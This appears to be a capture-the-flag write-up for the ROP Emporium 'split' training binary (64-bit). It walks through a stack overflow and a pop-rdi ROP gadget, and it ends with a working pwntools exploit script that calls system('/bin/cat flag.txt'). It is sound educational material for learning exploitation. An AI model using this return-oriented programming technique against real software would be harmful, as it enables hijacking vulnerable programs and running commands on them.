# split - 64 Bit
Program execution:
```
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> <input_here>
```
Run checksec: `checksec ./split`
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Dissassembly shows that `main` executes `pwnme` again. We can see that `pwnme` unsafely reads up to `0x60` bytes into a 32 byte buffer starting at `rbp-0x20`:
```assembly
lea     rax, [rbp-0x20 {var_28}]
mov     edx, 0x60
mov     rsi, rax {var_28}
mov     edi, 0x0
call    read
```
We have more than enough bytes to work with to overwrite the return address at `rbp+0x08`, so now we just need to work out what to jump to. There's no `win` function this time.

Run `rabin2 -i split` to view a list of imported functions available to the binary:
```
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00400550 GLOBAL FUNC       puts
2   0x00400560 GLOBAL FUNC       system
3   0x00400570 GLOBAL FUNC       printf
4   0x00400580 GLOBAL FUNC       memset
5   0x00400590 GLOBAL FUNC       read
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00000000 WEAK   NOTYPE     __gmon_start__
8   0x004005a0 GLOBAL FUNC       setvbuf
```
There is `system` available from GLIBC, so now we need to find a suitable string to either `cat` the flag or pop a shell.

We can view program string data with `rabin2 -z split`:
```
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```
Using the last string will allow use to execute `system('/bin/cat flag.txt')` to print out the flag.

To do this, we need to follow the 64-bit calling convention. The first argument (in this case the address of our string) must be placed in register RDI, before we call `system`.

To achieve this we will need to use a ROP gadget like `pop rdi; ret;` which would pop the top 8 bytes off the stack and load them into RDI, before returning into the address specified by the next 8 bytes of the stack. We can check for ROP gadgets by searching the binary with `ropper`.

`ropper -f split --search 'pop rdi; ret;'`:
```
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret;

[INFO] File: split
0x00000000004007c3: pop rdi; ret;
```

And we have a match, so we can use this gadget in our ROP chain! Note that we'll also need a `ret` gadget first, to maintaing 16-byte alignment.

Exploit script:
```python
#!/usr/bin/python3

from pwn import *

PROG_NAME = "./split"

p = process(PROG_NAME)
elf = p.elf
rop = ROP(elf)

if args.ATTACH:
	gdb.attach(p, '''break main''')

cat_flag_addr = 0x00601060

p.recvuntil(b'> ')

payload = b'A' * (0x20 + 0x8)
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(cat_flag_addr)
payload += p64(elf.symbols['system'])

p.sendline(payload)

p.interactive()
```